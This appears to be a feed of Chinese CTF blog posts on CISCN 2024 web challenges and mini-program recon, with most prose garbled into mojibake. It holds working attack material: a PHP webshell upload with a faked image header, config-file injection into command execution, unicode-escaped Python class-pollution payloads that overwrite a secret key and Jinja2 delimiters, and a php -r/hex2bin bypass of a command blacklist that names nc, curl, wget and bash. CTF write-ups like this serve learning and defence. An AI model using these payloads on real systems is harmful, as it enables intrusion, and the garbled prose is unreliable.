      <url>/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“CISCNç»“æœæ˜¯å¤§å¤§å‡ºä¹äº†æˆ‘ä»¬çš„æ„æ–™ï¼Œæœ¬æ¥æ˜¯å†²ç€ä¸‰ç­‰å»çš„æ²¡æƒ³åˆ°æœ€åæ‹¿äº†ä¸ª20åï¼ˆæˆ‘ä¸ªäººè®¤ä¸ºæˆ‘åœ¨è¿™æ¬¡çº¿ä¸‹èµ›çš„è¡¨ç°è¿˜æ˜¯éå¸¸å‡ºè‰²çš„ï¼Œå˜¿å˜¿ï¼‰ï¼Œwebçš„breakå’Œfixéƒ½å·®ä¸€é¢˜node.jsï¼ˆè€ƒnode.jsæ˜¯ä¸€ç‚¹éƒ½ä¸ä¼šå•Šä¹Ÿæ²¡å­˜æ–‡ç« ï¼Œï¼‰<br>æˆ‘è®°å¾—åˆšæ‰“å‡ºpythonåŸå‹é“¾æ±¡æŸ“çš„æ—¶å€™æ’åç›´æ¥åˆ°äº†11åå½“ç„¶å¾ˆå¿«å°±æ‰ä¸‹å»äº†å¸ˆå‚…ä»¬å¤ªå¼ºäº†<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/11%E5%90%8D.png" class="" title="alt text"></p><h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><h1 id="ç­¾åˆ°ä¸å¿…å¤šè¯´ï¼Œf12"><a href="#ç­¾åˆ°ä¸å¿…å¤šè¯´ï¼Œf12" class="headerlink" title="ç­¾åˆ°ä¸å¿…å¤šè¯´ï¼Œf12"></a>ç­¾åˆ°ä¸å¿…å¤šè¯´ï¼Œf12</h1><h1 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h1><h2 id="breakï¼šhe"><a href="#breakï¼šhe" class="headerlink" title="breakï¼šhe"></a>breakï¼šhe</h2><p>å¹½é»˜æ–‡ä»¶ä¸Šä¼ ï¼Œç›²ç›’æµ‹è¯•æ—¶å‘ç°å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶ï¼Œå¹½é»˜æ–‡ä»¶ä¸Šä¼ ï¼Œé˜Ÿå‹å’Œæˆ‘è¯´è¿™ä¸ªåªèƒ½ä¸Šä¼ pngå›¾ç‰‡ï¼Œå¹¶ä¸”æ£€æµ‹phpï¼Œæ‰€ä»¥æˆ‘ç›´æ¥ä¸Šä¼ äº†ç«¯æ ‡ç­¾çš„phpé©¬å¹¶å†å‰é¢æ·»åŠ äº†å›¾ç‰‡æ–‡ä»¶å¤´ï¼Œèµ›åå‘ç°å…¶åº”è¯¥åªæ˜¯å†æ–‡ä»¶é‡Œæ£€æµ‹äº†phpä¹‹ç±»çš„</p><h2 id="fixï¼š"><a href="#fixï¼š" class="headerlink" title="fixï¼š"></a>fixï¼š</h2><p>ç›´æ¥åŠ å›¾ç‰‡æ–‡ä»¶å°¾çš„ç™½åå•å³å¯</p><h1 id="ç²—å¿ƒçš„ç¨‹åºå‘˜"><a href="#ç²—å¿ƒçš„ç¨‹åºå‘˜" class="headerlink" title="ç²—å¿ƒçš„ç¨‹åºå‘˜"></a>ç²—å¿ƒçš„ç¨‹åºå‘˜</h1><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>åˆ†ææºç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå…¶åœ¨home.phpç›´æ¥å°†ä¿®æ”¹çš„ç”¨æˆ·ååŠ åˆ°äº†config.phpé‡Œè€Œconfig.phpæ˜¯å†webé¡µé¢çš„æ˜¯èƒ½è¢«è§£æåˆ°çš„ã€‚è€Œå…¶å°†å†™å…¥çš„å†…å®¹å‰åŠ äº†ä¸ªæ³¨é‡Šï¼Œä¸”æ²¡æœ‰è¿‡æ»¤?&lt;&gt;=é‚£ä¹ˆè¿™å°±å¯ä»¥ç›´æ¥ä½¿ç”¨?&gt;æ¥é¥¶è¿‡æ³¨é‡Šå†åˆ©ç”¨çŸ­æ ‡ç­¾æ¥æ‰§è¡Œå‘½ä»¤å†ä½¿ç”¨#æ¥æ³¨é‡Šåé¢æ‹¼æ¥çš„å†…å®¹ï¼Œå³å¯å‘½ä»¤æ‰§è¡Œ</p><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>æ£€æµ‹?,&gt;,&lt;ç­‰å…¶å°±æ— æ³•å‘½ä»¤æ‰§è¡Œäº†</p><h1 id="Polluted-Break"><a href="#Polluted-Break" class="headerlink" title="Polluted-Break"></a>Polluted-Break</h1><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/1.jpg" class="" title="alt text"><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/2.jpg" class="" title="alt text"><p>å®¡è®¡æºç ä¼šå‘ç°å…¶å­˜åœ¨mergeå¯ä»¥å‘ç°å…¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œè€Œ/è·¯ç”±ä¸‹ä¼šç›´æ¥å°†jsonå¤„ç†åˆ°mergeå‡½æ•°é‡Œã€‚<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/3.jpg" class="" title="alt text"><br>å…¶å­˜åœ¨wafï¼Œå¯ä»¥ä½¿ç”¨unicodeæ¥è¿›è¡Œç¼–ç ç»•è¿‡ã€‚<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/4.jpg" class="" title="alt text"><br>çœ‹adminè·¯ç”±ä¼šå‘ç°å…¶åªè¦usernameç­‰äºadminerï¼Œpasswordç­‰äºsecret_keyå³å¯ï¼Œé‚£ä¹ˆæ—¢ç„¶å­˜åœ¨æ±¡æŸ“å°±åªè¦æ±¡æŸ“secret_keyä¸ºaaaç„¶åç™»é™†å³å¯<br>æ±¡æŸ“ä»£ç å¦‚ä¸‹<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;adminer&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;\u0061\u0070\u0070&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">                    <span class="attr">&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;</span> <span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span>       </span><br><span class="line"></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>æ±¡æŸ“åå†adminè·¯ç”±ä¼ å…¥username=adminer&amp;password=aaa</p><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/5.jpg" class="" title="alt text"><p>å‘ç°å…¶flagæ˜¯<code>[%flag%]</code>æ­£å¸¸çš„jinja2æ¨¡æ¿åº”è¯¥æ˜¯<code>&#123;&#123;&#125;&#125;</code>ï¼Œè€Œé¢˜ç›®çš„flagä¸º[%%]æ‰€ä»¥æˆ‘ä»¬æ˜¯æ— æ³•è§£æçš„ï¼Œéœ€è¦å°†jinja2æ¨¡æ¿çš„<code>&#123;&#123;&#125;&#125;</code>æ±¡æŸ“ä¸º<code>[%%]</code><br>ä»£ç å¦‚ä¸‹<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;adminer&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">                    <span class="attr">&quot;jinja_env&quot;</span> <span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;variable_start_string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;[%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;variable_end_string&quot;</span><span class="punctuation">:</span><span class="string">&quot;%]&quot;</span><span class="punctuation">&#125;</span>    </span><br><span class="line"></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/6.jpg" class="" title="alt text"><br>ä½†æ˜¯æˆ‘å‘ç°åœ¨æ±¡æŸ“è¿‡ç¬¬ä¸€æ¬¡åå†æ±¡æŸ“å°±ä¼šå¾—åˆ°flagï¼Œæ‰€ä»¥æˆ‘ä»¬å°†é¢˜ç›®é‡ç½®åï¼Œå…ˆæ±¡æŸ“[%,åœ¨æ±¡æŸ“secret_keyæœ€åè®¿é—®ç™»é™†è®¿é—®adminè·¯ç”±å³å¯å¾—åˆ°flag<br><img src="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/7.jpg" class="" title="alt text"></p><h2 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h2><p>æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°å…¶mergeå‡½æ•°ä¸å­˜åœ¨ä»»ä½•åç»­åŠŸèƒ½ï¼Œå…¶å­˜åœ¨çš„ç›®çš„å¥½åƒå°±åªæœ‰æ±¡æŸ“ï¼Œé‚£ä¹ˆå°±ç›´æ¥å°†å…¶æ³¨é‡Šå³å¯<br>ä¹Ÿå¯ä»¥åŠ å¦‚ä¸‹waf<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">user_input</span>):</span><br><span class="line">    blacklisted_patterns = [<span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;string&#x27;</span>,<span class="string">&#x27;005f&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;006c&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklisted_patterns:</span><br><span class="line">        <span class="keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p><h1 id="æ€»çš„æ¥è¯´è¿™æ¬¡çš„CISCNå¯¹æˆ‘è¿™ä¸ªç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹èµ›çš„webç‹—æ¥è¯´æ˜¯éå¸¸åœ†æ»¡çš„"><a href="#æ€»çš„æ¥è¯´è¿™æ¬¡çš„CISCNå¯¹æˆ‘è¿™ä¸ªç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹èµ›çš„webç‹—æ¥è¯´æ˜¯éå¸¸åœ†æ»¡çš„" class="headerlink" title="æ€»çš„æ¥è¯´è¿™æ¬¡çš„CISCNå¯¹æˆ‘è¿™ä¸ªç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹èµ›çš„webç‹—æ¥è¯´æ˜¯éå¸¸åœ†æ»¡çš„"></a>æ€»çš„æ¥è¯´è¿™æ¬¡çš„CISCNå¯¹æˆ‘è¿™ä¸ªç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹èµ›çš„webç‹—æ¥è¯´æ˜¯éå¸¸åœ†æ»¡çš„</h1>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> æ¯”èµ›çš„æ„Ÿå¹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†è°ˆå¤–ç½‘ä¿¡æ¯æ”¶é›†(å¾®ä¿¡å°ç¨‹åº)</title>
      <link href="/2024/06/02/%E5%86%8D%E8%B0%88%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/06/02/%E5%86%8D%E8%B0%88%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="å¥½ä¹…æ²¡æœ‰æ°´åšå®¢äº†ã€‚ä¸»è¦æ˜¯æœ€è¿‘è€ƒè¯•è¿˜æœ‰ï¼Œæ‰“æ”»é˜²å¤ªå¿™äº†ï¼Œåˆšæ‰“å®Œä¸Šå‘¨çš„æ”»é˜²ï¼Œåšäº†5å¤©çš„ç‰¢ä¸»è¦éƒ½æ˜¯åœ¨ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ”»é˜²è¦æ‰“çš„å¥½ï¼Œä¿¡æ¯æ”¶é›†æ˜¯ä¸€å®šè¦åšå¥½çš„ã€‚"><a href="#å¥½ä¹…æ²¡æœ‰æ°´åšå®¢äº†ã€‚ä¸»è¦æ˜¯æœ€è¿‘è€ƒè¯•è¿˜æœ‰ï¼Œæ‰“æ”»é˜²å¤ªå¿™äº†ï¼Œåˆšæ‰“å®Œä¸Šå‘¨çš„æ”»é˜²ï¼Œåšäº†5å¤©çš„ç‰¢ä¸»è¦éƒ½æ˜¯åœ¨ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ”»é˜²è¦æ‰“çš„å¥½ï¼Œä¿¡æ¯æ”¶é›†æ˜¯ä¸€å®šè¦åšå¥½çš„ã€‚" class="headerlink" title="å¥½ä¹…æ²¡æœ‰æ°´åšå®¢äº†ã€‚ä¸»è¦æ˜¯æœ€è¿‘è€ƒè¯•è¿˜æœ‰ï¼Œæ‰“æ”»é˜²å¤ªå¿™äº†ï¼Œåˆšæ‰“å®Œä¸Šå‘¨çš„æ”»é˜²ï¼Œåšäº†5å¤©çš„ç‰¢ä¸»è¦éƒ½æ˜¯åœ¨ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ”»é˜²è¦æ‰“çš„å¥½ï¼Œä¿¡æ¯æ”¶é›†æ˜¯ä¸€å®šè¦åšå¥½çš„ã€‚"></a>å¥½ä¹…æ²¡æœ‰æ°´åšå®¢äº†ã€‚ä¸»è¦æ˜¯æœ€è¿‘è€ƒè¯•è¿˜æœ‰ï¼Œæ‰“æ”»é˜²å¤ªå¿™äº†ï¼Œåˆšæ‰“å®Œä¸Šå‘¨çš„æ”»é˜²ï¼Œåšäº†5å¤©çš„ç‰¢ä¸»è¦éƒ½æ˜¯åœ¨ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ”»é˜²è¦æ‰“çš„å¥½ï¼Œä¿¡æ¯æ”¶é›†æ˜¯ä¸€å®šè¦åšå¥½çš„ã€‚</h1><h1 id="ä»å°ç¨‹åºå¼€å§‹ä¿¡æ¯æ”¶é›†"><a href="#ä»å°ç¨‹åºå¼€å§‹ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä»å°ç¨‹åºå¼€å§‹ä¿¡æ¯æ”¶é›†"></a>ä»å°ç¨‹åºå¼€å§‹ä¿¡æ¯æ”¶é›†</h1><p>æ‰“äº†è¿™æ¬¡æ”»é˜²ï¼Œæˆ‘å‘ç°ç°åœ¨å„ç§ç³»ç»Ÿåå°çš„å¼±å¯†ç å·²ç»éå¸¸å°‘äº†ã€‚ç›´æ¥ä½¿ç”¨fofaç­‰å·¥å…·æ¥æ‰¾å¾ˆå®¹æ˜“å‡ºç°æ‰“æ­ªçš„æƒ…å†µã€‚<br>è€Œåœ¨è¿™æ¬¡æ”»é˜²é‡Œæˆ‘å­¦åˆ°äº†å¯ä»¥ä»å°ç¨‹åºæ¥è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå› ä¸ºå°ç¨‹åºæ˜¯è¿‘å‡ å¹´æ‰å…´èµ·çš„ï¼Œè¿™å›å¯¼è‡´å¾ˆå¤šå…¬å¸å¯¹å°ç¨‹åºçš„å®‰å…¨å¹¶ä¸é‡è§†ï¼Œè¿™å°±ä¼šå¯¼è‡´å°ç¨‹åºèƒŒåçš„ç½‘ç«™ç»å¸¸ä¼šå‡ºç°ï¼Œå¼±å¯†ç å’Œå¸¸è§çš„æ¡†æ¶æ¼æ´ã€‚</p><p>å¾ˆå¤šå°ç¨‹åºè™½ç„¶æ˜¯æ”¾åœ¨äº†å¾®ä¿¡ä¸Šä½†æ˜¯å…¶å®å°±æ˜¯é­”æ”¹çš„ç½‘ç«™ç½¢äº†ï¼Œæˆ‘ä»¬é€šè¿‡bpæ¥æŠ“åŒ…ä¼šå‘ç°å¾ˆå¤šå°ç¨‹åºçš„å¾ˆå¤šåŠŸèƒ½èµ°çš„éƒ½æ˜¯httpçš„åè®®ï¼Œé¢˜ç›®httpæŠ¥æ–‡æˆ‘ä»¬å°±å¯ä»¥å‘ç°å…¶æ‰€è¿æ¥çš„ç½‘ç«™ï¼Œä»è€Œæ‰¾åˆ°å…¶åå°ç½‘ç«™ï¼Œè€Œè¿™äº›åå°ç½‘ç«™ä¸€èˆ¬éƒ½æ˜¯å¾ˆè–„å¼±çš„èµ„äº§ï¼Œå¤§éƒ¨åˆ†å­˜åœ¨å¼±å¯†ç ï¼Œè€Œä¸”å¾ˆå¤šæ˜¯ä½¿ç”¨çš„å¼€æºå®½å‡ï¼ˆè€Œä¸”æ˜¯è€ç‰ˆæœ¬çš„ï¼‰è€Œé€šè¿‡å°ç¨‹åºæ‰¾åˆ°çš„ç½‘ç«™æˆ‘ä»¬æœ‰å¯ä»¥åœ¨é€šè¿‡ipåæŸ¥ï¼Œçˆ†ç ´å­åŸŸåç­‰æ¥æ‰©å¤§èµ„äº§ã€‚<br>è¿™é‡Œæˆ‘è´´ä¸€ä¸ªå¤§ç¥å†™çš„æ–‡ç« <a href="https://cloud.tencent.com/developer/article/1835727">å¾®ä¿¡å°ç¨‹åºçš„ä¿®ç‚¼äº”è„‰</a>è¿™ä½å¤§ç¥çš„è¿™ä¸ªç³»åˆ—æ–‡ç« å…±æœ‰äº”ç¯‡ã€‚å¹²è´§æ»¡æ»¡ã€‚</p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜² </category>
          
          <category> ä¿¡æ¯æ”¶é›† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜² </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024åˆèµ›å¤ç°</title>
      <link href="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™ä¸ªæ¯”èµ›ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ‰“çš„æ¯”è¾ƒå¤§çš„æ¯”èµ›ï¼Œä¸ºæ­¤æˆ‘è¿˜åœ¨èµ›å‰æŠŠå‰å‡ å¹´çš„é¢˜ç›®éƒ½åˆ·äº†ä¸€ä¸‹ï¼Œç»“æœä»Šå¹´çš„é¢˜ç›®æ€ä¹ˆå˜å¼‚äº†ï¼Œè¿™ä¹ˆéš¾ï¼ˆé“å¿ƒç»™æ•´ç¢äº†ï¼‰ï¼Œä¸ºæ­¤æˆ‘å†™ä¸‹è¿™ç¯‡åšå®¢æ¥å¤ç°å­¦ä¹ ã€‚"><a href="#è¿™ä¸ªæ¯”èµ›ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ‰“çš„æ¯”è¾ƒå¤§çš„æ¯”èµ›ï¼Œä¸ºæ­¤æˆ‘è¿˜åœ¨èµ›å‰æŠŠå‰å‡ å¹´çš„é¢˜ç›®éƒ½åˆ·äº†ä¸€ä¸‹ï¼Œç»“æœä»Šå¹´çš„é¢˜ç›®æ€ä¹ˆå˜å¼‚äº†ï¼Œè¿™ä¹ˆéš¾ï¼ˆé“å¿ƒç»™æ•´ç¢äº†ï¼‰ï¼Œä¸ºæ­¤æˆ‘å†™ä¸‹è¿™ç¯‡åšå®¢æ¥å¤ç°å­¦ä¹ ã€‚" class="headerlink" title="è¿™ä¸ªæ¯”èµ›ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ‰“çš„æ¯”è¾ƒå¤§çš„æ¯”èµ›ï¼Œä¸ºæ­¤æˆ‘è¿˜åœ¨èµ›å‰æŠŠå‰å‡ å¹´çš„é¢˜ç›®éƒ½åˆ·äº†ä¸€ä¸‹ï¼Œç»“æœä»Šå¹´çš„é¢˜ç›®æ€ä¹ˆå˜å¼‚äº†ï¼Œè¿™ä¹ˆéš¾ï¼ˆé“å¿ƒç»™æ•´ç¢äº†ï¼‰ï¼Œä¸ºæ­¤æˆ‘å†™ä¸‹è¿™ç¯‡åšå®¢æ¥å¤ç°å­¦ä¹ ã€‚"></a>è¿™ä¸ªæ¯”èµ›ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ‰“çš„æ¯”è¾ƒå¤§çš„æ¯”èµ›ï¼Œä¸ºæ­¤æˆ‘è¿˜åœ¨èµ›å‰æŠŠå‰å‡ å¹´çš„é¢˜ç›®éƒ½åˆ·äº†ä¸€ä¸‹ï¼Œç»“æœä»Šå¹´çš„é¢˜ç›®æ€ä¹ˆå˜å¼‚äº†ï¼Œè¿™ä¹ˆéš¾ï¼ˆé“å¿ƒç»™æ•´ç¢äº†ï¼‰ï¼Œä¸ºæ­¤æˆ‘å†™ä¸‹è¿™ç¯‡åšå®¢æ¥å¤ç°å­¦ä¹ ã€‚</h1><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>è¿™é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™å…¶å®å·²ç»å·®ä¸å¤šåšå‡ºæ¥äº†ï¼Œå¯æ˜¯å‡ºé¢˜äººæŠŠflagè—åˆ°äº†æ•°æ®åº“é‡Œã€‚ã€‚ã€‚ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>é¦–å…ˆå¯ä»¥çœ‹åˆ°å…¶ä½¿ç”¨äº†escapeshellcmdå‡½æ•°<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/1.png" class="" title="alt text"><br>è¿™ä¸ªå‡½æ•°æœºä¼šå°†æ‰€æœ‰ä¸å‘½ä»¤æ‰§è¡Œæœ‰å…³çš„å‡½æ•°éƒ½è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨æ‰“æ¯”èµ›çš„æ—¶å€™å¹¶æ²¡æœ‰æ‰¾åˆ°æ€ä¹ˆç»•è¿‡è¿™ä¸ªå‡½æ•°ã€‚æˆ‘å†ç½‘ä¸Šçœ‹åˆ°äº†ä¸¤ç§ç»•æ³•<br><strong>1</strong>.åœ¨æ‰“æ¯”èµ›æœŸé—´æˆ‘ä»¬ç”¨çš„æ˜¯php -r æ¥æ‰§è¡Œphpä»£ç ï¼Œç”±äºphp -rå’Œæ˜¯å°†å­—ç¬¦ä¸²å½“æˆphpå‘½ä»¤æ¥æ‰§è¡Œæ‰€ä»¥å…¶å³ä½¿å­—ç¬¦è¢«è½¬ä¹‰ä¹Ÿä¸å½±å“æ‰§è¡Œã€‚é‚£ä¹ˆè¿™æ ·å°±å¯ä»¥æ‰§è¡Œphpä»£ç ã€‚<br><strong>2</strong>.æˆ‘å†èµ›åçœ‹å…¶ä»–å¸ˆå‚…çš„wpçŸ¥é“äº†ï¼Œliunxç³»ç»Ÿç«Ÿç„¶ä¹Ÿæœ‰evalå‡½æ•°ã€‚é‚£ä¹ˆç›´æ¥ä½¿ç”¨eval l\sè¿™æ ·å°±å¯ä»¥ç»•è¿‡wafå’Œescapesshellcmdå‡½æ•°ã€‚ï¼ˆå¯ä»¥ç”¨ç³»ç»Ÿè‡ªå¸¦çš„evalæ¥ç»•è¿‡escapeshellcmdï¼Œè¿™ä¹ˆç®€å•çš„ç»•æ³•å†ç½‘ä¸Šç«Ÿç„¶æŸ¥ä¸åˆ°ï¼‰</p><h2 id="é¦–å…ˆæ˜¯ç”¨ç¬¬ä¸€ç§ç»•æ³•æ¥å†™"><a href="#é¦–å…ˆæ˜¯ç”¨ç¬¬ä¸€ç§ç»•æ³•æ¥å†™" class="headerlink" title="é¦–å…ˆæ˜¯ç”¨ç¬¬ä¸€ç§ç»•æ³•æ¥å†™"></a>é¦–å…ˆæ˜¯ç”¨ç¬¬ä¸€ç§ç»•æ³•æ¥å†™</h2><p><code>php -r $a=hex2bin(substr(_6C73,1,100));system($a);</code><br>é¦–å…ˆç”±äºæˆ‘ä»¬æ— æ³•è¾“å…¥å¦‚lsç­‰ç³»ç»Ÿå‘½ä»¤ï¼Œæ‰€æœ‰æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨æ•°å­—å‡½æ•°æ¥è¿›è¡Œä»»æ„å­—ç¬¦çš„æ„é€ ï¼Œè€Œå†2019å¹´çš„CISCNä¸Šå‡ºè¿‡ä¸€é“åˆ©ç”¨æ•°å­—å‡½æ•°æ¥å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®å«<a 